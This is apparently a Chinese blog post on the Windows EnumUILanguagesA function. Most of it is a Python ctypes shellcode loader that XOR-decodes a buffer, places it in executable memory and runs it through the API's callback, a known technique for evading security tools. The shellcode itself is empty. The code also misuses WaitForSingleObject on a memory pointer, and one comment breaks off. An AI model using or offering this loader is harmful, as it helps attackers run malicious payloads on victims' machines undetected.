## 正题

##### EnumUILanguagesA

EnumUILanguages 函数枚举系统上可用的 UI 语言。

```
\# win32 Api原型
BOOL EnumUILanguagesA(
  UILANGUAGE\_ENUMPROC pUILangEnumProc, // 回调函数
  DWORD dwFlags,                       // 保留值，必须为0
  LONG\_PTR lParam                      // 回调函数的传参位置，没有即为0
);
```

###### 以EnumUILanguagesA调用shellcode

```
\# -\*- coding: utf-8 -\*-
\# @Time : 2022-01-19 22:12
\# @Author : ILU
\# @File : EnumUILanguagesA.py

import ctypes

sc = b''.decode()
key = 50
buf = \[ord(sc\[i\]) ^ key for i in range(len(sc))\]
buf = bytearray(buf)
kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c\_uint64
ptr = kernel32.VirtualAlloc(
    ctypes.c\_int(0),
    ctypes.c\_int(len(buf)),
    ctypes.c\_int(0x00001000),  \# #define MEM\_COMMIT  0x00001000
    ctypes.c\_int(0x40)  \# #define PAGE\_EXECUTE\_READWRITE  0x40
)
buffer = (ctypes.c\_char \* len(buf)).from\_buffer(buf)
kernel32.RtlMoveMemory(
    ctypes.c\_uint64(ptr),
    buffer,
    ctypes.c\_int(len(buf))
)
kernel32.EnumUILanguagesA(ctypes.c\_char\_p(ptr), ctypes.c\_int16(0), ctypes.c\_int16(0))
\# 等待运行的线程关闭再关闭程序，-1为INFINITE无限等待的意思
\# 第一个参数：线程句柄
\# 第二个参数: d
kernel32.WaitForSingleObject(ctypes.c\_uint64(ptr), ctypes.c\_int(\-1))
kernel32.CloseHandle(ptr)
```
